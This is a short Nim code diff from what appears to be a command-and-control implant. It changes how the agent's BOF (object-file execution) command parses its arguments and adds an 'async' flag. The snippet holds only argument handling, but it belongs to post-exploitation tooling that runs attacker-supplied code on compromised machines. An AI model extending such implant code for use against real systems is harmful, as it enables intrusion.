@@ -186,8 +186,10 @@ when ((MODULES and cast[uint32](MODULE_BOF)) == cast[uint32](MODULE_BOF)):
 
     commands[CMD_BOF] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
-            let objectFile = task.args[0].data
-            var arguments: seq[byte] = Bytes.fromHex(task.args[1].data)
+            let 
+                objectFile: seq[byte] = task.args[0].data
+                arguments: seq[byte] = Bytes.fromHex(task.args[1].data)
+                async: bool = cast[bool](task.args[2].data[0])
 
             # Unpacking object file, since it contains the file name too.
             var unpacker = Unpacker.init(Bytes.toString(objectFile))
